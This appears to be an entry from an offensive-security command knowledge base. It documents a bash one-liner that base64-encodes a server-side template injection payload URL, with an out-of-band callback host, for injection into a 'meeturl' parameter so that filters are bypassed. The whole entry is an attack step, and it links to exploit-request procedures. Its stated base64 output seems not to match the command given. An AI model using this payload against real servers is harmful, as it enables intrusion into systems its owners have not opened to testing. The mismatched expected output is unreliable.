---
data: >-
  echo -n
  'http://cmd4cvnei56gu9etg220pa1hb7eewx6cu.oast.fun/?id=LMN%{1337*1337}#.xx//'
  | base64
tags:
  - encoding
  - ssti
type: command
output: >-
  aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8=
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.372Z'
id: 89eadd30-6f2c-4aa1-86fb-e484be4735ac
verified: false
validated: true
submitted: true
---
# encode-ssti-payload-base64

## Command

```bash
echo -n 'http://cmd4cvnei56gu9etg220pa1hb7eewx6cu.oast.fun/?id=LMN%{1337*1337}#.xx//' | base64
```

## Description

This command base64-encodes a URL containing an SSTI payload for injection into the meeturl parameter, bypassing potential filters and enabling template expression evaluation on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo -n` | Outputs the string without newline | Yes |
| `payload string` | The SSTI URL with OAST callback and expression | Yes |
| `| base64` | Pipes to base64 encoder | Yes |

## Examples

### Basic Usage

```bash
echo -n 'http://example.oast/?test=%{1*1}' | base64
```

### Advanced Usage

```bash
echo -n 'http://cmd4cvnei56gu9etg220pa1hb7eewx6cu.oast.fun/?id=LMN%{1337*1337}#.xx//' | base64 -w 0
```

## Expected Output

Base64-encoded string, e.g., aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8=, ready for URL parameter use.

## Related

- [[commands/send-ssti-exploit-request]]
- [[procedures/Encode-and-Inject-SSTI-Payload]]
